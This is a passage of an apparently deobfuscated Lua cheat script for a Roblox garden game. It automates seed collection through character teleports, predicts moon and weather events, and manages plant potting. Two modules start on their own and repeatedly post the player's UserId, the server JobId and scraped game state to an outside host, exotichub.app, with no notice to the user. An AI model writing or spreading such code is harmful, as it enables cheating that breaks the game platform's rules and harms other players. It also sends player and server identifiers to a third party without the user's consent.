		return g, g and "Moon debug post sent" or tostring(E or "Debug post failed")
	end;
	Start = function()
		if Z.MoonPredictor.Started then
			return
		end
		Z.MoonPredictor.Started = true
		task.spawn(function()
			while Z.MoonPredictor.Started do
				local G, V = pcall(Z.MoonPredictor.Update)
				if not G then
					g.MoonPredictorStatusText = ""
					warn("[Moon Predictor]", V)
				end
				task.wait(1)
			end
		end)
	end
}
Z.MoonPredictionApi = {
	Url = "https://exotichub.app/gag2predict";
	Busy = false;
	Started = false;
	Debug = false,
	Interval = 30,
	PredictionCount = 20,
	LastSignature = "";
	GetMoonPredictionIconId = function(G)
		local V = Z.MoonPredictor.GetNight()
		local y = V and (V.Weathers and V.Weathers[tostring(G or "")]) or nil
		local j = type(y) == "table" and tostring(y.Image or "") or ""
		return j:match("%d+") or "0"
	end;
	GetMoonPredictionIcons = function()
		local G = Z.MoonPredictor.GetNight()
		local V = {}
		if not G or type(G.Weathers) ~= "table" then
			return V
		end
		for G, y in G.Weathers do
			local Z = type(y) == "table" and tostring(y.Image or "") or ""
			V[tostring(G)] = Z:match("%d+") or "0"
		end
		return V
	end,
	GetMoonPredictionEvents = function()
		local G = Z.MoonPredictor.GetRare(Z.MoonPredictionApi.PredictionCount, Z.MoonPredictor.RollMode)
		if type(G) ~= "table" then
			return nil
		end
		local V = {}
		for G, y in ipairs(G) do
			local j = tostring(y.Name or "")
			local i = math.floor(tonumber(y.At) or 0)
			if j == "" or i <= 0 then
				continue
			end
			table.insert(V, {
				name = j,
				starts_at = i;
				cycle = math.floor(i / 600);
				icon_id = Z.MoonPredictionApi.GetMoonPredictionIconId(j)
			})
		end
		return V
	end,
	BuildMoonPredictionPayload = function()
		local G = y.LocalPlayer
		local V = Z.MoonPredictionApi.GetMoonPredictionEvents()
		if not G or not G.UserId or type(V) ~= "table" then
			return nil
		end
		local j = math.floor(Z.MoonPredictor.GetServerTime())
		local i = tostring(y.Workspace:GetAttribute("ActivePhase") or "Unknown")
		local c = tostring(y.Workspace:GetAttribute("ActiveWeather") or "Unknown")
		local J = math.floor(tonumber(y.Workspace:GetAttribute("PhaseDuration")) or 0)
		return {
			version = 1,
			game = "gag2";
			generated_at = j;
			source = {
				user_id = tostring(G.UserId);
				job_id = tostring(game.JobId or ""),
				place_version = tonumber(game.PlaceVersion) or 0
			},
			phase = {
				name = i,
				weather = c;
				ends_at = J,
				icon_id = i == "Night" and Z.MoonPredictionApi.GetMoonPredictionIconId(c) or "0"
			};
			next_night_at = math.floor(Z.MoonPredictor.GetNextNightAt()),
			icons = Z.MoonPredictionApi.GetMoonPredictionIcons(),
			predictions = V
		}
	end;
	BuildMoonPredictionSignature = function(G)
		if type(G) ~= "table" or type(G.phase) ~= "table" or type(G.predictions) ~= "table" then
			return nil
		end
		local V = {
			tostring(G.phase.name or "");
			tostring(G.phase.weather or ""),
			tostring(G.phase.ends_at or 0);
			tostring(G.next_night_at or 0)
		}
		for G, y in ipairs(G.predictions) do
			table.insert(V, table.concat({
				tostring(y.name or "");
				tostring(y.starts_at or 0);
				tostring(y.icon_id or "0")
			}, "\031"))
		end
		return table.concat(V, "\030")
	end;
	SendMoonPredictionApi = function()
		if Z.MoonPredictionApi.Busy then
			return false
		end
		local G = Z.MoonPredictionApi.BuildMoonPredictionPayload()
		local V = Z.MoonPredictionApi.BuildMoonPredictionSignature(G)
		if type(G) ~= "table" or type(V) ~= "string" or V == "" then
			return false
		end
		if V == Z.MoonPredictionApi.LastSignature then
			return false
		end
		Z.MoonPredictionApi.Busy = true
		local j, i, c, J, T = pcall(function()
			return r.Http.PostJson(Z.MoonPredictionApi.Url, G)
		end)
		Z.MoonPredictionApi.Busy = false
		if not j then
			if Z.MoonPredictionApi.Debug then
				warn("[MoonPredictionApi] Request crashed:", i)
			end
			return false
		end
		if not i then
			if Z.MoonPredictionApi.Debug then
				warn("[MoonPredictionApi] Request failed:", tostring(T or c))
			end
			return false
		end
		Z.MoonPredictionApi.LastSignature = V
		if Z.MoonPredictionApi.Debug then
			print("[MoonPredictionApi] Status:", c)
			print("[MoonPredictionApi] Response:", tostring(J or ""))
			print("[MoonPredictionApi] Payload:", y.HttpService:JSONEncode(G))
		end
		return true
	end;
	LoopMoonPredictionApi = function()
		local G, V = pcall(Z.MoonPredictionApi.SendMoonPredictionApi)
		if not G and Z.MoonPredictionApi.Debug then
			warn("[MoonPredictionApi] Loop error:", V)
		end
	end,
	StartMoonPredictionApi = function()
		if Z.MoonPredictionApi.Started then
			return false
		end
		Z.MoonPredictionApi.Started = true
		task.spawn(function()
			task.wait(5)
			while Z.MoonPredictionApi.Started do
				Z.MoonPredictionApi.LoopMoonPredictionApi()
				task.wait(Z.MoonPredictionApi.Interval)
			end
		end)
		return true
	end
}
Z.MoonPredictionApi.StartMoonPredictionApi()
Z.LiveMapPetsApi = {
	Url = "https://exotichub.app/gag2livepets",
	Busy = false,
	Started = false;
	Interval = 7,
	LastSignature = nil,
	GetIconId = function(G)
		local V = type(y.PetData) == "table" and y.PetData[G] or nil
		local Z = type(V) == "table" and tostring(V.Image or "") or ""
		return Z:match("%d+") or "0"
	end,
	GetPets = function()
		local G = Z.PetFinderPremium.GetFolder()
		if not G then
			return nil
		end
		local V = Z.PetFinderPremium.GetServerTime()
		local y = {}
		local j = {}
		local i = {}
		for G, j in ipairs(G:GetChildren()) do
			local c = Z.PetFinderPremium.GetPetData(j)
			if not c or c.ownerId ~= 0 or Z.PetFinderPremium.IsExpired(c) then
				continue
			end
			local J = tostring(c.name or "")
			local T = tostring(c.size or "Normal")
			local d = tostring(c.variant or "Normal")
			local u = tostring(c.rarity or "Unknown")
			local q = Z.LiveMapPetsApi.GetIconId(c.name)
			local g = math.floor(tonumber(c.expiresAt) or 0)
			local E = math.max(math.floor(g - V), 0)
			if J == "" or E <= 0 then
				continue
			end
			table.insert(i, table.concat({
				J,
				T;
				d;
				u,
				q,
				tostring(g)
			}, "\031"))
			local a = table.concat({
				J;
				T,
				d
			}, "\031")
			if not y[a] then
				y[a] = {
					n = J;
					s = T;
					v = d,
					r = u,
					i = q,
					a = 0;
					t = E
				}
			end
			y[a].a += 1
			y[a].t = math.max(y[a].t, E)
			if y[a].i == "0" and q ~= "0" then
				y[a].i = q
			end
		end
		for G, V in pairs(y) do
			table.insert(j, V)
		end
		table.sort(j, function(G, V)
			if G.n ~= V.n then
				return G.n < V.n
			end
			if G.s ~= V.s then
				return G.s < V.s
			end
			return G.v < V.v
		end)
		table.sort(i)
		return j, table.concat(i, "\030")
	end,
	Send = function()
		if Z.LiveMapPetsApi.Busy then
			return false
		end
		local G = false
		local V = y.LocalPlayer
		local j = tostring(game.JobId or "")
		local i, c = Z.LiveMapPetsApi.GetPets()
		if not V or not V.UserId or j == "" or type(i) ~= "table" or type(c) ~= "string" then
			return false
		end
		local J = table.concat({
			j;
			tostring(game.PlaceVersion or 0);
			c
		}, "\029")
		if J == Z.LiveMapPetsApi.LastSignature then
			return false
		end
		Z.LiveMapPetsApi.Busy = true
		local T = {
			j = j;
			u = tostring(V.UserId);
			pv = tonumber(game.PlaceVersion) or 0;
			p = i
		}
		local d, u, q, g, E = pcall(function()
			return r.Http.PostJson(Z.LiveMapPetsApi.Url, T)
		end)
		Z.LiveMapPetsApi.Busy = false
		if not d then
			if G then
				warn("[LiveMapPetsApi] Request crashed:", u)
			end
			if G then
				warn("[LiveMapPetsApi] Request crashed:", u)
			end
			return false
		end
		if G then
			print("[LiveMapPetsApi] Status:", q)
			print("[LiveMapPetsApi] Response:", tostring(g or ""))
		end
		if not u then
			if G then
				warn("[LiveMapPetsApi] Request failed:", tostring(E or "Unknown error"))
			end
			return false
		end
		Z.LiveMapPetsApi.LastSignature = J
		return true
	end,
	Start = function()
		if Z.LiveMapPetsApi.Started then
			return
		end
		Z.LiveMapPetsApi.Started = true
		task.spawn(function()
			task.wait(5)
			while Z.LiveMapPetsApi.Started do
				pcall(Z.LiveMapPetsApi.Send)
				task.wait(Z.LiveMapPetsApi.Interval)
			end
		end)
	end
}
Z.GardenItems = {
	Busy = false,
	AlreadyRunningPetPlayer = false;
	IsOwnAutoDropItemGardenItems = function(G)
		if not G or G.Parent ~= y.DroppedItems then
			return false
		end
		if h.auto_drop_items_enabled ~= true or h.auto_drop_preview_only == true then
			return false
		end
		if tostring(G:GetAttribute("DroppedBy") or "") ~= tostring(g.player_userid or "") then
			return false
		end
		local V = tostring(G:GetAttribute("ItemCategory") or "")
		if V == "" then
			return true
		end
		if Z.AutoDropItems and type(Z.AutoDropItems.IsSelectedAutoDropItems) == "function" then
			return Z.AutoDropItems.IsSelectedAutoDropItems(h.auto_drop_categories, V)
		end
		return type(h.auto_drop_categories) == "table" and h.auto_drop_categories[V] == true
	end;
	PetSeedCollectSystem = {
		IsOurSeed = function(G)
			if not G or G.Parent ~= y.DroppedItems then
				return false
			end
			if G:GetAttribute("ItemCategory") ~= "Seeds" then
				return false
			end
			return tonumber(G:GetAttribute("DroppedBy")) == tonumber(g.player_userid)
		end;
		Claim = function(G)
			if not h.auto_collect_drop_seeds or Z.GardenItems.Busy or Z.GardenItems.IsOwnAutoDropItemGardenItems(G) or not Z.GardenItems.PetSeedCollectSystem.IsOurSeed(G) then
				return false
			end
			local V = Z.ProximityPrompt.FindProximityPromptByClass(G)
			if not V or not V.Enabled then
				return false
			end
			Z.GardenItems.Busy = true
			local y = g.TeleportLockNames.GardenItemCollector
			local j = 2
			if h.garden_items_use_player_walk then
				j = g.PetAndSeedTravelTimeoutSeconds + 2
			end
			local i = Z.Teleport.LockTeleport(y, j, h.garden_items_use_player_walk == true)
			if not i then
				Z.GardenItems.Busy = false
				return false
			end
			local c, J = pcall(function()
				if h.garden_items_use_player_walk then
					if not Z.Movement.WalkPathToTarget(G, g.PetAndSeedTravelTimeoutSeconds, y, 10) then
						return false
					end
					task.wait(.05)
					if not V.Parent or not Z.GardenItems.PetSeedCollectSystem.IsOurSeed(G) then
						return false
					end
					Z.ProximityPrompt.ActivateProximityPrompt(V)
					return true
				end
				return Z.TargetPivotTeleport.StickToTargetUntilTargetPivotTeleport(G, y, {
					TimeoutTargetPivotTeleport = 5,
					RefreshIntervalTargetPivotTeleport = .15;
					ActionIntervalTargetPivotTeleport = .2,
					RepeatActionTargetPivotTeleport = true,
					ValidateTargetPivotTeleport = function(G)
						return Z.GardenItems.PetSeedCollectSystem.IsOurSeed(G)
					end,
					DoneTargetPivotTeleport = function(G)
						return not Z.GardenItems.PetSeedCollectSystem.IsOurSeed(G)
					end;
					ActionTargetPivotTeleport = function(G)
						local V = Z.ProximityPrompt.FindProximityPromptByClass(G)
						if V and (V.Parent and V.Enabled) then
							Z.ProximityPrompt.ActivateProximityPrompt(V)
						end
					end
				})
			end)
			Z.Teleport.UnlockTeleport(y)
			Z.GardenItems.Busy = false
			return c and J == true
		end
	};
	StartSeedCollectorPetsAndPlayer = function()
		if Z.GardenItems.AlreadyRunningPetPlayer then
			return
		end
		Z.GardenItems.AlreadyRunningPetPlayer = true
		y.DroppedItems.ChildAdded:Connect(function(G)
			Z.GardenItems.PetSeedCollectSystem.Claim(G)
		end)
		task.spawn(function()
			while true do
				task.wait(5)
				if h.auto_collect_drop_seeds then
					for G, V in ipairs(y.DroppedItems:GetChildren()) do
						if Z.GardenItems.PetSeedCollectSystem.Claim(V) then
							task.wait(.5)
						end
					end
				end
			end
		end)
	end
}
Z.GardenItems.StartSeedCollectorPetsAndPlayer()
g.PottedPlantWeatherGuardStatusText = ""
g.PottedPlantWeatherGuardRetryAt = g.PottedPlantWeatherGuardRetryAt or {}
g.PottedPlantWeatherGuardNextStackIndex = g.PottedPlantWeatherGuardNextStackIndex or 0
g.PottedPlantWeatherGuardLastWeatherActive = g.PottedPlantWeatherGuardLastWeatherActive or false
Z.GardenItems.PottedPlantWeatherGuard = {
	BusyPottedPlantWeatherGuard = false;
	ManualBusyPottedPlantWeatherGuard = false;
	CancelManualPottedPlantWeatherGuard = false;
	StackBasePositionPottedPlantWeatherGuard = nil;
	StackBaseModePottedPlantWeatherGuard = "";
	SetStatusPottedPlantWeatherGuard = function(G, V)
		G = tostring(G or "")
		if G == "" then
			g.PottedPlantWeatherGuardStatusText = ""
			return false
		end
		g.PottedPlantWeatherGuardStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\141\128 [Pot Guard]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), G)
		return true
	end;
	GetActionDelayPottedPlantWeatherGuard = function()
		return math.clamp(tonumber(h.potted_weather_guard_action_delay) or .3, .001, 5)
	end,
	ResetStackPlacementPottedPlantWeatherGuard = function()
		g.PottedPlantWeatherGuardNextStackIndex = 0
		Z.GardenItems.PottedPlantWeatherGuard.StackBasePositionPottedPlantWeatherGuard = nil
		Z.GardenItems.PottedPlantWeatherGuard.StackBaseModePottedPlantWeatherGuard = ""
	end;
	IsSelectionEmptyPottedPlantWeatherGuard = function(G)
		if type(G) ~= "table" then
			return true
		end
		for G, V in pairs(G) do
			if V == true or type(G) == "number" and tostring(V or "") ~= "" then
				return false
			end
		end
		return true
	end;
	IsSelectedPottedPlantWeatherGuard = function(G, V)
		V = tostring(V or "")
		if V == "" or type(G) ~= "table" then
			return false
		end
		if G[V] == true then
			return true
		end
		for G, y in pairs(G) do
			if tostring(y or "") == V then
				return true
			end
		end
		return false
	end,
	CleanPlantIdPottedPlantWeatherGuard = function(G)
		G = tostring(G or "")
		return G:match("^%d+_(.+)$") or G
	end,
	GetPlantModelByIdPottedPlantWeatherGuard = function(G)
		G = Z.GardenItems.PottedPlantWeatherGuard.CleanPlantIdPottedPlantWeatherGuard(G)
		if G == "" then
			return nil
		end
		for V, y in ipairs(Z.Farm.GetPlants()) do
			if typeof(y) ~= "Instance" or not y.Parent then
				continue
			end
			local j = Z.GardenItems.PottedPlantWeatherGuard.CleanPlantIdPottedPlantWeatherGuard(y:GetAttribute("PlantId") or y:GetAttribute("Id") or y.Name)
			if j == G then
				return y
			end
		end
		return nil
	end;
	GetPlantDataByIdPottedPlantWeatherGuard = function(G)
		G = Z.GardenItems.PottedPlantWeatherGuard.CleanPlantIdPottedPlantWeatherGuard(G)
		if G == "" then
			return nil
		end
		local V = y.GardenSyncController
		if type(V) == "table" and type(V.GetPlant) == "function" then
			local y, Z = pcall(function()
				return V:GetPlant(g.player_userid, G)
			end)
			if y and type(Z) == "table" then
				return Z
			end
		end
		local j = Z.FruitFiltersDataSync
		local i = j and (type(j.Plants) == "table" and j.Plants[G]) or nil
		if type(i) == "table" then
			return i
		end
		return nil
	end;
	GetPlantNameFromModelPottedPlantWeatherGuard = function(G, V)
		if typeof(G) == "Instance" then
			local V = tostring(G:GetAttribute("SeedName") or G:GetAttribute("PlantName") or "")
			if V ~= "" then
				return V
			end
		end
		return type(V) == "table" and tostring(V.PlantName or "") or ""
	end;
	IsPlantReadyFromModelPottedPlantWeatherGuard = function(G, V)
		local y = Z.GardenItems.PottedPlantWeatherGuard
		if y.IsPlantAlreadyPottedPottedPlantWeatherGuard(G, V) then
			return true
		end
		if type(V) == "table" and (Z.FruitFiltersDataSync and type(Z.FruitFiltersDataSync.IsPlantReady) == "function") then
			local G, y = pcall(Z.FruitFiltersDataSync.IsPlantReady, V)
			if G and y == true then
				return true
			end
		end
		if typeof(G) ~= "Instance" then
			return false
		end
		local j = tonumber(G:GetAttribute("Age") or G:GetAttribute("CurrentAge")) or 0
		local i = tonumber(G:GetAttribute("MaxAge")) or (type(V) == "table" and tonumber(V.MaxAge)) or 0
		return i > 0 and j >= i
	end;
	IsPlantAlreadyPottedPottedPlantWeatherGuard = function(G, V)
		if type(V) == "table" and V.IsPotted == true then
			return true
		end
		if typeof(G) ~= "Instance" then
			return false
		end
		return G:FindFirstChild("PotVisual") ~= nil or G:FindFirstChild("PickUpPottedPlantPrompt", true) ~= nil
	end;
	GetEmptyPotToolPottedPlantWeatherGuard = function()
		for G, V in ipairs(Z.Backpack.GetBackpackAllItems()) do
			if V and (V:IsA("Tool") and V:GetAttribute("EmptyPot")) then
				local G = Z.StackKeepOverrides.GetGearNameFromToolStackKeepOverrides(V, "Basic Pot")
				local y = Z.StackKeepOverrides.GetToolCountStackKeepOverrides(V)
				if not Z.StackKeepOverrides.ShouldSkipItemStackKeepOverrides("Gear", G, y) then
					return V
				end
			end
		end
		return nil
	end,
	GetPottedPlantToolsPottedPlantWeatherGuard = function()
		local G = {}
		for V, y in ipairs(Z.Backpack.GetBackpackAllItems()) do
			if y and (y:IsA("Tool") and y:GetAttribute("PottedPlant")) then
				local V = tostring(y:GetAttribute("PlantName") or y:GetAttribute("Seed") or "")
				local Z = tostring(y:GetAttribute("Id") or "")
				if V ~= "" and Z ~= "" then
					table.insert(G, {
						tool = y,
						id = Z;
						plantName = V
					})
				end
			end
		end
		table.sort(G, function(G, V)
			if G.plantName ~= V.plantName then
				return G.plantName < V.plantName
			end
			return G.id < V.id
		end)
		return G
	end;
	GetPropAreasPottedPlantWeatherGuard = function()
		local G = {}
		local V = Z.Farm.GetOwnPlot()
		if not V then
			return G
		end
		for V, Z in ipairs(V:GetDescendants()) do
			if Z:IsA("BasePart") and y.CollectionService:HasTag(Z, "PropArea") then
				table.insert(G, Z)
			end
		end
		return G
	end;
	IsPositionInPropAreaPottedPlantWeatherGuard = function(G)
		if typeof(G) ~= "Vector3" then
			return false
		end
		for V, y in ipairs(Z.GardenItems.PottedPlantWeatherGuard.GetPropAreasPottedPlantWeatherGuard()) do
			local Z = y.CFrame:PointToObjectSpace(G)
			local j = y.Size * .5
			if math.abs(Z.X) <= j.X + .5 and math.abs(Z.Z) <= j.Z + .5 then
				return true
			end
		end
		return false
	end;
	ProjectPositionToPropAreaPottedPlantWeatherGuard = function(G, V)
		if typeof(G) ~= "Vector3" then
			return nil
		end
		V = math.max(tonumber(V) or 1, 0)
		local y
		local j = math.huge
		for Z, i in ipairs(Z.GardenItems.PottedPlantWeatherGuard.GetPropAreasPottedPlantWeatherGuard()) do
			local c = i.CFrame:PointToObjectSpace(G)
			local J = math.max(i.Size.X / 2 - V, 0)
			local T = math.max(i.Size.Z / 2 - V, 0)
			local d = math.clamp(c.X, - J, J)
			local u = math.clamp(c.Z, - T, T)
			local q = i.CFrame:PointToWorldSpace(Vector3.new(d, i.Size.Y / 2, u))
			local g = ((q - G)).Magnitude
			if g < j then
				j = g
				y = q
			end
		end
		return y
	end,
	GetRandomPropPositionPottedPlantWeatherGuard = function(G)
		local V = Z.GardenItems.PottedPlantWeatherGuard.GetPropAreasPottedPlantWeatherGuard()
		if # V == 0 then
			return nil
		end
		G = math.max(tonumber(G) or 1, 0)
		local y = V[Z.Farm._Random:NextInteger(1, # V)]
		local j = math.max(y.Size.X / 2 - G, 0)
		local i = math.max(y.Size.Z / 2 - G, 0)
		local c = Z.Farm._Random:NextNumber(- j, j)
		local J = Z.Farm._Random:NextNumber(- i, i)
		return y.CFrame:PointToWorldSpace(Vector3.new(c, y.Size.Y / 2, J))
	end,
	GetGridOpenPositionPottedPlantWeatherGuard = function(G, V, y, j)
		local i = Z.ControlMode.RightCol
		if type(j) == "string" and j ~= "" then
			i = Z.ControlMode.BothCol
		end
		if y == true then
			local G = {}
			for y, i in ipairs(Z.FarmGrid.GetSortedSpotsFarmGrid(nil, i)) do
				local c = type(j) ~= "string" or j == "" or i.areaName == j
				if c and (typeof(i.position) == "Vector3" and Z.Seeder.IsPositionOpen(i.position, V)) then
					table.insert(G, i)
				end
			end
			if # G <= 0 then
				return nil
			end
			return G[Z.Farm._Random:NextInteger(1, # G)].position
		end
		local c = Z.FarmGrid.GetOpenSpotFarmGrid(G, i, function(G)
			if type(j) == "string" and (j ~= "" and G.areaName ~= j) then
				return false
			end
			return typeof(G.position) == "Vector3" and Z.Seeder.IsPositionOpen(G.position, V)
		end)
		return c and c.position or nil
	end;
	GetSavedCFrameTextPottedPlantWeatherGuard = function()
		local G = h.potted_weather_guard_saved_cframe
		local V = type(G) == "table" and tonumber(G.x) or nil
		local y = type(G) == "table" and tonumber(G.y) or nil
		local Z = type(G) == "table" and tonumber(G.z) or nil
		local j = type(G) == "table" and tonumber(G.rotation) or nil
		if not V or not y or not Z or not j then
			return "\240\159\147\141 Stack CFrame: Not set"
		end
		return string.format("\240\159\147\141 Stack CFrame: X %.2f | Y %.2f | Z %.2f | R %.1f\194\176", V, y, Z, j)
	end,
	SaveCurrentCFramePottedPlantWeatherGuard = function()
		local G = y.Character and y.Character:FindFirstChild("HumanoidRootPart")
		if not G then
			return false, "Character not found"
		end
		local V = Z.Farm.GetPlantAreaAtPosition(G.Position)
		if not V then
			return false, "Stand inside your farm"
		end
		local j, i = G.CFrame:ToOrientation()
		h.potted_weather_guard_saved_cframe = {
			x = G.Position.X;
			y = G.Position.Y,
			z = G.Position.Z,
			rotation = math.deg(i)
		}
		a.Save.SaveDataSync()
		return true, "Pot stack position saved"
	end,
	GetSavedPlacementPottedPlantWeatherGuard = function(G, V)
		local y = tostring(h.potted_weather_guard_place_mode or "Saved Location")
		local j = Z.GardenItems.PottedPlantWeatherGuard
		if y == "Random" then
			local G = j.GetGridOpenPositionPottedPlantWeatherGuard(nil, V, true)
			if not G then
				return nil, nil, "No open restore position found"
			end
			return G, 0, nil
		end
		local i
		local c = 0
		local J
		local T = y
		if Z.Farm.IsPlacementModeFarm(y) then
			local G, V, j = Z.Farm.GetPlacementPositionFarm(y)
			T = y .. (":" .. tostring(j or ""))
			if j ~= W.Default then
				i = G
				if V then
					J = V.Name
				end
			else
				i = Z.Farm.GetPermanentCenterPosition()
			end
			if typeof(i) ~= "Vector3" then
				return nil, nil, tostring(j or "Farm position") .. " not found"
			end
		else
			local G = h.potted_weather_guard_saved_cframe
			local V
			local y
			local Z
			if type(G) == "table" then
				V = tonumber(G.x)
				y = tonumber(G.y)
				Z = tonumber(G.z)
				c = tonumber(G.rotation) or 0
			end
			if not V or not y or not Z then
				return nil, nil, "Copy a stack CFrame"
			end
			i = Vector3.new(V, y, Z)
		end
		local d = math.max(math.floor(tonumber(G) or 0), 0)
		local u = j.StackBasePositionPottedPlantWeatherGuard
		if d == 0 or j.StackBaseModePottedPlantWeatherGuard ~= T or typeof(u) ~= "Vector3" then
			u = j.GetGridOpenPositionPottedPlantWeatherGuard(i, V, false, J)
			if not u then
				if Z.Farm.IsPlacementModeFarm(y) then
					return nil, nil, "No open position near farm placement"
				end
				return nil, nil, "No open position near saved location"
			end
			j.StackBasePositionPottedPlantWeatherGuard = u
			j.StackBaseModePottedPlantWeatherGuard = T
		end
		local q = 0
		if h.potted_weather_guard_place_same_spot ~= true then
			local G = math.clamp(tonumber(h.potted_weather_guard_y_step) or 4, .5, 25)
			q = d * G
		end
		return Vector3.new(u.X, u.Y + q, u.Z), c, nil
	end,
	GetSelectedPlantDropdownPottedPlantWeatherGuard = function()
		if Z.PlantShovel and type(Z.PlantShovel.GetPlantTypeDropdown) == "function" then
			return Z.PlantShovel.GetPlantTypeDropdown()
		end
		return Z.SeedData.GetSeedDataListDropDown()
	end,
	GetPlantMutationDropdownPottedPlantWeatherGuard = function()
		local G = {}
		local V = {}
		for y, Z in ipairs(Z.FruitFilters.GetVariantNames()) do
			Z = tostring(Z or "")
			if Z ~= "" and not V[Z] then
				V[Z] = true
				table.insert(G, Z)
			end
		end
		for y, Z in ipairs(Z.FruitFilters.GetMutationNames()) do
			Z = tostring(Z or "")
			if Z ~= "" and not V[Z] then
				V[Z] = true
				table.insert(G, Z)
			end
		end
		return G
	end;
	GetPlantMutationInfoPottedPlantWeatherGuard = function(G, V)
		local y = type(V) == "table" and tostring(V.Mutation or "") or ""
		local j = type(V) == "table" and tostring(V.Variant or "") or ""
		if typeof(G) == "Instance" then
			local V = G:GetAttribute("Mutation")
			local Z = G:GetAttribute("Variant")
			if type(V) == "string" then
				y = V
			end
			if type(Z) == "string" then
				j = Z
			end
		end
		local i, c = Z.FruitFilters.GetMutationLookup({
			ob = G;
			m = y,
			Mutation = y,
			v = j;
			Variant = j
		})
		local J = Z.FruitFilters.GetFruitVariant({
			ob = G,
			m = y,
			Mutation = y;
			v = j;
			Variant = j
		}, c)
		return y, c, J
	end;
	PassesPlantMutationSelectionPottedPlantWeatherGuard = function(G, V)
		local y = h.potted_weather_guard_plant_mutations
		if Z.GardenItems.PottedPlantWeatherGuard.IsSelectionEmptyPottedPlantWeatherGuard(y) then
			return true
		end
		local j, i, c = Z.GardenItems.PottedPlantWeatherGuard.GetPlantMutationInfoPottedPlantWeatherGuard(G, V)
		if Z.GardenItems.PottedPlantWeatherGuard.IsSelectedPottedPlantWeatherGuard(y, c) then
			return true
		end
		if type(i) == "table" then
			for G in pairs(i) do
				if Z.GardenItems.PottedPlantWeatherGuard.IsSelectedPottedPlantWeatherGuard(y, G) then
					return true
				end
			end
		end
		return j ~= "" and Z.GardenItems.PottedPlantWeatherGuard.IsSelectedPottedPlantWeatherGuard(y, j)
	end,
	GetFruitWeightLimitsPottedPlantWeatherGuard = function()
		local G = math.max(tonumber(h.potted_weather_guard_fruit_min_kg) or 0, 0)
		local V = tonumber(h.potted_weather_guard_fruit_max_kg) or 100000000
		if V < G then
			V = G
		end
		return G, V
	end,
	GetFruitWeightPlantMatchesPottedPlantWeatherGuard = function(G)
		local V = {}
		local y = Z.FruitFiltersDataSync
		if not y or type(y.GetFruits) ~= "function" then
			return V
		end
		local j, i = Z.GardenItems.PottedPlantWeatherGuard.GetFruitWeightLimitsPottedPlantWeatherGuard()
		for y, c in ipairs(y.GetFruits()) do
			if type(c) ~= "table" then
				continue
			end
			local J = tostring(c.name or "")
			local T = Z.GardenItems.PottedPlantWeatherGuard.CleanPlantIdPottedPlantWeatherGuard(c.plantId)
			local d = tonumber(c.kg or c.w) or 0
			if J == "" or T == "" then
				continue
			end
			if not Z.GardenItems.PottedPlantWeatherGuard.IsSelectedPottedPlantWeatherGuard(G, J) then
				continue
			end
			if d >= j and d <= i then
				V[T] = true
			end
		end
		return V
	end;
	GetMatchingPlantsPottedPlantWeatherGuard = function(G)
		local V = {}
		local y = h.potted_weather_guard_selected_plants
		local j = Z.FruitFiltersDataSync
		G = G == true
		if not G and Z.GardenItems.PottedPlantWeatherGuard.IsSelectionEmptyPottedPlantWeatherGuard(y) then
			return V
		end
		if not j or type(j.Plants) ~= "table" then
			return V
		end
		if not j.Started and type(j.StartSync) == "function" then
			j.StartSync()
		end
		if type(j.SyncFromGarden) == "function" then
			pcall(j.SyncFromGarden, true, true)
		end
		local i = Z.GardenItems.PottedPlantWeatherGuard
		local c = {}
		if not G then
			c = i.GetFruitWeightPlantMatchesPottedPlantWeatherGuard(y)
		end
		local J = {}
		for T, d in pairs(j.Plants) do
			if type(d) ~= "table" or d.Removed then
				continue
			end
			local u = i.CleanPlantIdPottedPlantWeatherGuard(d.PlantId or d.Id or T)
			local q = i.GetPlantModelByIdPottedPlantWeatherGuard(u)
			local g = i.GetPlantDataByIdPottedPlantWeatherGuard(u) or d
			local E = i.GetPlantNameFromModelPottedPlantWeatherGuard(q, g)
			if E == "" or u == "" then
				continue
			end
			local a = i.IsPlantAlreadyPottedPottedPlantWeatherGuard(q, g)
			if G then
				if not a then
					continue
				end
			else
				if not i.IsSelectedPottedPlantWeatherGuard(y, E) then
					continue
				end
				if Z.SeedData.IsSingleHarvest(E) then
					continue
				end
				if not i.PassesPlantMutationSelectionPottedPlantWeatherGuard(q, g) then
					continue
				end
				if not a then
					if c[u] ~= true then
						continue
					end
					if type(j.IsPlantReady) == "function" and not j.IsPlantReady(g) then
						continue
					end
				end
			end
			J[u] = true
			table.insert(V, {
				id = u;
				plantName = E;
				isPotted = a,
				plantModel = q
			})
		end
		for j, T in ipairs(Z.Farm.GetPlants()) do
			if typeof(T) ~= "Instance" or not T.Parent then
				continue
			end
			local d = i.CleanPlantIdPottedPlantWeatherGuard(T:GetAttribute("PlantId") or T:GetAttribute("Id") or T.Name)
			if d == "" or J[d] == true then
				continue
			end
			local u = i.GetPlantDataByIdPottedPlantWeatherGuard(d)
			local q = i.GetPlantNameFromModelPottedPlantWeatherGuard(T, u)
			local g = i.IsPlantAlreadyPottedPottedPlantWeatherGuard(T, u)
			if q == "" then
				continue
			end
			if G then
				if not g then
					continue
				end
			else
				if not i.IsSelectedPottedPlantWeatherGuard(y, q) then
					continue
				end
				if Z.SeedData.IsSingleHarvest(q) then
					continue
				end
				if not i.PassesPlantMutationSelectionPottedPlantWeatherGuard(T, u) then
					continue
				end
				if not g then
					if c[d] ~= true then
						continue
					end
					if not i.IsPlantReadyFromModelPottedPlantWeatherGuard(T, u) then
						continue
					end
				end
			end
			J[d] = true
			table.insert(V, {
				id = d,
				plantName = q,
				isPotted = g,
				plantModel = T
			})
		end
		table.sort(V, function(G, V)
			if G.plantName ~= V.plantName then
				return G.plantName < V.plantName
			end
			return G.id < V.id
		end)
		return V
	end;
	PotPlantPottedPlantWeatherGuard = function(G, V)
		if type(G) ~= "table" or G.id == "" then
			return false
		end
		if G.isPotted == true then
			return true
		end
		local j = y.Networking and (y.Networking.Garden and y.Networking.Garden.PotPlant)
		if not j or type(j.Fire) ~= "function" then
			return false, "Pot action unavailable"
		end
		if not V or not V.Parent then
			V = Z.GardenItems.PottedPlantWeatherGuard.GetEmptyPotToolPottedPlantWeatherGuard()
		end
		if not V or not V.Parent then
			return false, "Basic Pot not found"
		end
		local i = Z.StackKeepOverrides.GetGearNameFromToolStackKeepOverrides(V, "Basic Pot")
		local c = Z.StackKeepOverrides.GetToolCountStackKeepOverrides(V)
		if Z.StackKeepOverrides.ShouldSkipItemStackKeepOverrides("Gear", i, c) then
			return false, "Basic Pot not found"
		end
		if not Z.Player.IsToolHeld(V) and not Z.Player.EquipTool(V) then
